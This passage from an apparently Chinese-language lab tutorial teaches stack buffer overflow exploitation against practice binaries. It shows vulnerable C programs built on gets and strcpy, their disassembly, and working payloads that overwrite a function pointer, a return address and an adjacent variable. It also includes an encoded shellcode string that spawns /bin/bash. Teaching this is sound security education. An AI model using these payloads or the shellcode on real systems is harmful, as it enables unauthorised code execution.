it.</p><p>源代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*func)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">win</span><span class="params">()</span><span class="comment">//输出成功提示信息的函数</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Congratulations, you pwned it.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    func fp;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    fp =<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">gets</span>(buffer);<span class="comment">// 可引发缓冲区溢出</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(fp)<span class="comment">// 判断函数指针变量fp是否不为NULL</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;calling function pointer, jumping to 0x%08X\n&quot;</span>, fp);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fp</span>();<span class="comment">//调用fp</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序定义了一个与buffer相邻的函数指针变量fp，然后使用gets获取输入数据，我们知道gets是不安全的函数，这里会引发缓冲区溢出，fp变量的值可以被改写，当fp的值被改写为win函数的地址时，就可以输出成功提示的信息。</p><h2 id="利用缓冲区溢出改写函数指针"><a href="#利用缓冲区溢出改写函数指针" class="headerlink" title="利用缓冲区溢出改写函数指针"></a>利用缓冲区溢出改写函数指针</h2><p>一样查看主函数的反汇编</p><p><img src="/.io//image-20240208205610265.png" alt="image-20240208205610265"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">0x08048428 &lt;+0&gt;:push   %ebp</span><br><span class="line"></span><br><span class="line">0x08048429 &lt;+1&gt;:mov    %esp,%ebp</span><br><span class="line"></span><br><span class="line">0x0804842b &lt;+3&gt;:and    $0xfffffff0,%esp</span><br><span class="line"></span><br><span class="line">; 在栈上开辟0x60字节的空间</span><br><span class="line"></span><br><span class="line">0x0804842e &lt;+6&gt;:sub    $0x60,%esp</span><br><span class="line"></span><br><span class="line">; 初始化fp的值为NULL，其中fp位于[esp+0x5c]</span><br><span class="line"></span><br><span class="line">0x08048431 &lt;+9&gt;:     movl   $0x0,0x5c(%esp)</span><br><span class="line"></span><br><span class="line">; 执行gets(buffer)，其中buffer位于[esp+0x1c]</span><br><span class="line"></span><br><span class="line">0x08048439 &lt;+17&gt;:lea0x1c(%esp),%eax</span><br><span class="line"></span><br><span class="line">0x0804843d &lt;+21&gt;:mov    %eax,(%esp)</span><br><span class="line"></span><br><span class="line">0x08048440 &lt;+24&gt;:call0x8048320&lt;gets@plt&gt;</span><br><span class="line"></span><br><span class="line">; 判断fp是否为NULL</span><br><span class="line"></span><br><span class="line">0x08048445 &lt;+29&gt;:    cmpl   $0x0,0x5c(%esp)</span><br><span class="line"></span><br><span class="line">0x0804844a &lt;+34&gt;:je0x8048467&lt;main+63&gt;</span><br><span class="line"></span><br><span class="line">0x0804844c &lt;+36&gt;:mov    $0x8048554,%eax</span><br><span class="line"></span><br><span class="line">0x08048451 &lt;+41&gt;:mov0x5c(%esp),%edx</span><br><span class="line"></span><br><span class="line">0x08048455 &lt;+45&gt;:mov    %edx,0x4(%esp)</span><br><span class="line"></span><br><span class="line">0x08048459 &lt;+49&gt;:mov    %eax,(%esp)</span><br><span class="line"></span><br><span class="line">0x0804845c &lt;+52&gt;:call0x8048340 &lt;printf@plt&gt;</span><br><span class="line"></span><br><span class="line">; 执行fp()</span><br><span class="line"></span><br><span class="line">0x08048461 &lt;+57&gt;:mov0x5c(%esp),%eax</span><br><span class="line"></span><br><span class="line">0x08048465 &lt;+61&gt;:call*%eax</span><br><span class="line"></span><br><span class="line">0x08048467 &lt;+63&gt;:mov    $0x0,%eax</span><br><span class="line"></span><br><span class="line">0x0804846c &lt;+68&gt;:leave</span><br><span class="line"></span><br><span class="line">0x0804846d &lt;+69&gt;:ret</span><br></pre></td></tr></table></figure><p>通过对上面的汇编代码进行分析，我们知道buffer位于esp+0x1c处，而fp位于esp+0x5c处，两个地址的距离为0x5c - 0x1c &#x3D; 0x40，即64，刚好为buffer数组的大小。因此当输入数据的长度超过64字节时，fp变量就可以被覆盖，但需要控制fp变量的值还需要小心的构造数据。我们只要合理控制环境变量参数的第65~68字节的内容，就可以成功发起溢出攻击了。</p><p>现在的问题是找到函数win的地址信息，然后将fp的值改写为win函数的地址，这样就可以达到调用win函数的目的了。前面提到过使用objdump可以查看函数的地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d pwn4</span><br></pre></td></tr></table></figure><p>在输出信息中找到win函数的信息：</p><p><img src="/.io//image-20240208210003800.png" alt="image-20240208210003800"></p><p>或者可以跟着用grep命令，快速找到那一行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d pwn4 | grep win</span><br></pre></td></tr></table></figure><p>可以看到win函数的地址为0x08048414，因为机器采用小端格式，因此执行下面的语句就可以成功发起溢出攻击了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;print &#x27;A&#x27;*64+&#x27;\x14\x84\x04\x08&#x27;&quot;</span> | ./pwn4</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240208210108784.png" alt="image-20240208210108784"></p><h1 id="返回地址覆盖"><a href="#返回地址覆盖" class="headerlink" title="返回地址覆盖"></a>返回地址覆盖</h1><h2 id="背景-3"><a href="#背景-3" class="headerlink" title="背景"></a>背景</h2><p>函数调用约定描述了函数传递参数的方式和栈协同工作的技术细节，不同的函数调用约定原理基本相同，但在细节上是有差别的，包括函数参数的传递方式、参数的入栈顺序、函数返回时由谁来平衡堆栈扥。本实验中着重讲解C语言函数调用约定。</p><p>通过前面几个PWN系列实验的学习，也许你已经发现了在gdb中通过disas指令对main函数进行反汇编时，函数的开头和结尾的反汇编指令都是一样的：</p><p>push  %ebp</p><p>mov  %esp,%ebp</p><p>……</p><p>leave</p><p>ret</p><p>在函数的开头，首先是一条push %ebp指令，将ebp寄存器压入栈中，用于保存ebp寄存器的值，接着是mov %esp,%ebp将esp寄存器的值传递给ebp寄存器；在函数的末尾，leave指令相当于mov %ebp,%esp和pop %ebp两条指令，其作用刚好与开头的两条指令相反，即恢复esp和ebp寄存器的内容。</p><p>如果在函数A中调用了函数B，我们称函数A为主调函数，函数B为被调函数，如果函数B的声明为int B(int arg1, int arg2, int arg3)，那么函数A中的调用函数B时的汇编指令的形式如下：</p><p>push arg3</p><p>push arg2</p><p>push arg1</p><p>call B</p><p>连续三个push将函数的参数按照从右往左的顺序进行压栈，然后执行call B来调用函数B。注意在gdb中看到的效果可能不是三个push，而是三个mov来对栈进行操作，这是因为Linux采用AT&amp;T风格的汇编，而上面的指令使用的是Intel风格的汇编，比较容易理解。</p><p>call指令的内部细节为：将下一条指令的地址压入栈中，然后跳转到函数B去执行代码。这里说的call下一条指令的地址也就是通常所说的返回地址。函数B最后一条retn指令会从栈上弹出返回地址，并赋值给EIP寄存器，达到返回函数A继续执行的目的。</p><p><img src="/.io//image-20240209174948974.png" alt="image-20240209174948974"></p><p>基本的缓冲区溢出攻击通常是通过改写函数返回地址的形式来发起攻击的。如A调用B函数，正常情况下B函数返回时执行retn指令，从栈上取出返回地址跳转回A函数继续执行代码。而一旦返回地址被缓冲区溢出数据改写，那么我们就可以控制函数B跳转到指定的地方去执行代码了。</p><p><img src="/.io//image-20240209175005807.png" alt="image-20240209175005807"></p><p>主机&#x2F;home&#x2F;test&#x2F;5目录下有一个pwn5程序，执行这个程序可以输入数据进行测试，正常情况下程序接收输入数据后不会产生任何输出信息并直接退出，然后当输入一定的数据量时，可能会提示Segmentation fault的错误信息，当输入的精心构造的输入数据时可对程序发起溢出攻击，达到改写程序执行流程的目的，攻击成功时将输出如下信息：</p><p>Congratulations, you pwned it.</p><p>源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Congratulations, you pwned it.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">    gets(buffer);    <span class="comment">// 存在缓冲区溢出</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序定义了一个64字节大小的buffer数组，然后使用gets获取输入数据，我们知道gets是不安全的函数，这里会引发缓冲区溢出，栈上函数的返回地址可以被改写，当返回地址被改写为win函数的地址时，就可以输出成功提示的信息。</p><h2 id="返回地址覆盖-1"><a href="#返回地址覆盖-1" class="headerlink" title="返回地址覆盖"></a>返回地址覆盖</h2><p>利用gdb调试，查看主函数汇编</p><p><img src="/.io//image-20240209175221359.png" alt="image-20240209175221359"></p><p>显然在0x08048408存在溢出漏洞</p><p>首先使用b *0x080483f8对main函数的第一条指令下一个断点，同时使用b *0x08048408对gets函数的调用下一个断点，然后输入r命令运行程序，将会在第一个断点处断下</p><p>查看esp寄存器的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i r <span class="variable">$esp</span></span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240209175440796.png" alt="image-20240209175440796"></p><p>这时候esp寄存器的值为0xffffd6cc。按C继续执行，在第二个断点断下，通过对汇编指令的分析，我们知道eax寄存器存储了buffer的起始地址，所以运行<code>i r $eax</code>来查看buffer的地址：</p><p><img src="/.io//image-20240209175603275.png" alt="image-20240209175603275"></p><p>我们看到eax寄存器的值为0xffffd680，那么这两个地址的差为76，如下图下图所示：</p><p><img src="/.io//image-20240209175633692.png" alt="image-20240209175633692"></p><p>也就是说，在覆盖了76字节数据后，如果再覆盖4个字节，就可以把返回地址覆盖为我们想要的地址了。</p><p>在gdb中执行disas win查看win函数的地址为0x080483e4，或者objdump。接下来就可以构造输入数据来发起溢出攻击了。</p><p><img src="/.io//image-20240209175753177.png" alt="image-20240209175753177"></p><p>通过上面的步骤我们已经知道，只要合理控制输入数据的第77~80字节的内容，就可以实现对函数返回地址进行覆盖，从而成功发起溢出攻击了。</p><p>现在win函数的地址为0x080483e4，转换为小端格式就是’\xe4\x83\x04\x08’，那么可以构造这样的命令来进行溢出测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;print &#x27;A&#x27;*76+&#x27;\xe4\x83\x04\x08&#x27;&quot;</span> | ./pwn5</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240209175905857.png" alt="image-20240209175905857"></p><h1 id="环境变量继承"><a href="#环境变量继承" class="headerlink" title="环境变量继承"></a>环境变量继承</h1><h2 id="背景-4"><a href="#背景-4" class="headerlink" title="背景"></a>背景</h2><p>在Linux&#x2F;Windows操作系统中, 每个进程都有其各自的环境变量设置。 缺省情况下, 当一个进程被创建时，除了创建过程中的明确更改外，它继承了其父进程的绝大部分环境变量信息。</p><p>   扩展的C语言main函数可以传递三个参数，除了argc和argv参数外，还能接受一个char**类型的envp参数。envp指向一个字符串数组，该数组存储了当前进程具体的环境变量的内容，envp的最后一个元素指向NULL，此为envp结束的标识符。</p><p>   打印环境变量参数信息的示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>** argv,<span class="type">char</span>** envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i =<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(envp[i])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;envp[%2d] = %s\n&quot;</span>, i, envp[i]);</span><br><span class="line">        i +=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译这段代码生成env程序，然后在命令行下执行，可以看到程序打印出了具体的环境变量参数信息：</p><p>环境变量的格式为：环境变量名&#x3D;环境变量值</p><p>当父进程启动一个子进程时，子进程会继承父进程的环境变量信息。在Linux Shell下，通过export可以给Shell添加一个环境变量，此后通过Shell启动的子进程都会拥有这个环境变量。</p><p><img src="/.io//image-20240209180224864.png" alt="image-20240209180224864"></p><p>在Shell中执行export testenv&#x3D;”Hello_World”之后，再执行.&#x2F;env，可以看到新的环境变量已经被子进程继承了。</p><p><img src="/.io//image-20240209180237403.png" alt="image-20240209180237403"></p><p> Python的os模块提供创建子进程以及修改环境变量的函数，其中os.system函数可以创建一个子进程，且子进程会继承父进程的环境变量参数信息；os.putenv可以修改进程的环境变量参数信息。</p><p>Linux Shell中，可以使用$()或者两个反引号（&#96; ）来包裹一条shell命令，并返回shell命令的执行结果。 </p><p>比如执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> testenv2=`python -c <span class="string">&quot;print &#x27;A&#x27;*20&quot;</span>`</span><br></pre></td></tr></table></figure><p>命令后，再执行.&#x2F;env可以看到有一个名为testenv2的环境变量，其值为20个A。</p><p>主机&#x2F;home&#x2F;test&#x2F;3目录下有一个pwn3程序，这个程序会对进程中名为HEETIAN的环境变量的值进行处理，通过构造特定的环境变量参数数据可以对程序发起溢出攻击，成功会提示<strong>Congratulations, you pwned it.<strong>，失败则会提示</strong>Please try again.<strong>的提示信息。注意：如果没有设置HEETIAN这个环境变量，那么运行程序后将输出</strong>Please set the HEETIAN environment variable</strong>，之后程序自动退出。</p><p>源代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> modified;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">    <span class="type">char</span>* variable;</span><br><span class="line">    variable = <span class="built_in">getenv</span>(<span class="string">&quot;HEETIAN&quot;</span>);<span class="comment">// 获取环境变量HEETIAN的值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(variable ==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Please set the HEETIAN environment variable\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        modified =<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">strcpy</span>(buffer, variable);<span class="comment">// 调用strcpy进行字符串复制，可引发缓冲区溢出</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(modified ==<span class="number">0x0d0a0d0a</span>)<span class="comment">// 判断modified的值是否为0x0d0a0d0a</span></span><br><span class="line">    &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Congratulations, you pwned it.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Please try again, you got 0x%08X\n&quot;</span>, modified);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="环境变量继承-1"><a href="#环境变量继承-1" class="headerlink" title="环境变量继承"></a>环境变量继承</h2><p>程序首先通过getenv函数获取名为HEETIAN的环境变量参数，然后使用strcpy函数将其值复制到buffer缓冲区中，我们知道这样可以引发缓冲区溢出。</p><p>这里当设置超长的环境变量参数数据时，将会产生缓冲区溢出，数据覆盖buffer后会继续覆盖modified变量。</p><p>使用gdb调试并查看主函数反汇编</p><p><img src="/.io//image-20240209180907715.png" alt="image-20240209180907715"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">0x0804848d &lt;+9&gt;: movl $0x80485d4,(%esp)</span><br><span class="line"></span><br><span class="line">; 调用getenv获取环境变量HEETIAN的值</span><br><span class="line"></span><br><span class="line">0x08048494 &lt;+16&gt;: call 0x8048364 &lt;getenv@plt&gt;</span><br><span class="line"></span><br><span class="line">; 将结果保存到variable变量，即[esp+0x5c]</span><br><span class="line"></span><br><span class="line">0x08048499 &lt;+21&gt;: mov %eax,0x5c(%esp)</span><br><span class="line"></span><br><span class="line">; 判断返回结果是否为NULL</span><br><span class="line"></span><br><span class="line">0x0804849d &lt;+25&gt;: cmpl $0x0,0x5c(%esp)</span><br><span class="line"></span><br><span class="line">0x080484a2 &lt;+30&gt;: jne 0x80484bc &lt;main+56&gt;</span><br><span class="line"></span><br><span class="line">   ......</span><br><span class="line"></span><br><span class="line">; 初始化modified变量的值为0，位于[esp+0x58]</span><br><span class="line"></span><br><span class="line">0x080484bc &lt;+56&gt;: movl $0x0,0x58(%esp)</span><br><span class="line"></span><br><span class="line">; 调用strcpy对buffer进行填充，位于[esp+0x18]</span><br><span class="line"></span><br><span class="line">0x080484c4 &lt;+64&gt;: mov 0x5c(%esp),%eax</span><br><span class="line"></span><br><span class="line">0x080484c8 &lt;+68&gt;: mov %eax,0x4(%esp)</span><br><span class="line"></span><br><span class="line">0x080484cc &lt;+72&gt;: lea 0x18(%esp),%eax</span><br><span class="line"></span><br><span class="line">0x080484d0 &lt;+76&gt;: mov %eax,(%esp)</span><br><span class="line"></span><br><span class="line">0x080484d3 &lt;+79&gt;: call 0x8048384 &lt;strcpy@plt&gt;</span><br><span class="line"></span><br><span class="line">; 判断modified变量的值是否为0x0d0a0d0a</span><br><span class="line"></span><br><span class="line">0x080484d8 &lt;+84&gt;: cmpl $0xd0a0d0a,0x58(%esp)</span><br><span class="line"></span><br><span class="line">   ......</span><br></pre></td></tr></table></figure><p>通过对上面的汇编代码进行分析，我们知道buffer位于esp+0x18处，而modified位于esp+0x58处，两个地址的距离为0x58 - 0x18 &#x3D; 0x40，即64，刚好为buffer数组的大小。因此当环境变量HEETIAN的值的数据超过64字节时，modified变量就可以被覆盖，但需要控制modified变量的值还需要小心的构造数据。我们只要合理控制环境变量参数的第65~68字节的内容，就可以成功发起溢出攻击了。</p><p>因为目标机器采用小端格式存储数据，而if语句分支要求modified的值为0x0d0a0d0a时才通过判断，因此我们构造的数据应该为\x0a\x0d\x0a\x0d。下面通过两种不同的方法来修改环境变量以达到攻击效果。</p><p><strong>方法一：通过export修改环境变量</strong></p><p>前面已经介绍过通过export可以修改环境变量，执行下面的语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> HEETIAN=$(python -c <span class="string">&quot;print &#x27;A&#x27;*64+&#x27;\x0a\x0d\x0a\x0d&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后运行.&#x2F;pwn3就可以看到攻击效果了，如图所示：</p><p><strong>方法二：通过python脚本动态修改环境变量</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    os.putenv(<span class="string">&quot;HEETIAN&quot;</span>,<span class="string">&quot;A&quot;</span>*<span class="number">64</span>+<span class="string">&quot;\x0a\x0d\x0a\x0d&quot;</span>)</span><br><span class="line">    os.system(<span class="string">&quot;./pwn3&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure><p>为了排除前面的环境变量的干扰，我们先修改HEETIAN的的值为AAA，然后再执行python脚本，可以看到攻击效果，如图所示：</p><p><img src="/.io//image-20240209181709836.png" alt="image-20240209181709836"></p><h1 id="执行Shellcode"><a href="#执行Shellcode" class="headerlink" title="执行Shellcode"></a>执行Shellcode</h1><h2 id="背景-5"><a href="#背景-5" class="headerlink" title="背景"></a>背景</h2><p> Shellcode指缓冲区溢出攻击中植入进程的恶意代码，这段代码可以弹出一个消息框，也可以在目标机器上打开一个监听端口，甚至是删除目标机器上的重要文件等。</p><p>   Shellcode通常需要使用汇编语言进行开发，并转换成二进制机器码，其内容和长度经常还会受到很多实际条件的限制，因此开发Shellcode通常都是非常困难的。在实际场景中，我们通常使用Metasploit这个工具来定制各种功能的Shellcode，当然也可以去网上查找一些现有的Shellcode进行测试，通常在shell-storm以及exploit-db等网站上都能找到一些比较成熟和稳定的shellcode，网址为：</p><p><a href="http://shell-storm.org/shellcode/">http://shell-storm.org/shellcode/</a></p><p><a href="http://www.exploit-db.com/shellcode/">http://www.exploit-db.com/shellcode/</a></p><p>在缓冲区溢出攻击中，如何执行我们的Shellcode呢？我们一般通过输入数据来将Shellcode传递给目标进程，我们已经知道了如何改写函数的返回地址，那么我们可以让程序跳转到栈上的Shellcode去执行，那么就达到了执行Shellcode的目的了。</p><p>一种可行的方案如下图所示：</p><p><img src="/.io//image-20240209182622598.png" alt="image-20240209182622598"></p><p>我们将Shellcode填充到返回地址以上的栈空间中，然后将返回地址改写为Shellcode的起始地址，这样在执行retn指令的时候，就相当于跳转到Shellcode去执行了。</p><p>主机&#x2F;home&#x2F;test&#x2F;6目录下有一个pwn6程序，执行这个程序可以输入数据进行测试，正常情况下程序接收输入数据后不会产生任何输出信息并直接退出，然而当输入一定的数据量时，可能会提示<strong>Segmentation fault</strong>的错误信息，当输入的精心构造的输入数据时可对程序发起溢出攻击，达到执行Shellcode的目的。下面这段Shellcode用于执行&#x2F;bin&#x2F;bash：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81</span><br></pre></td></tr></table></figure><p>源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span 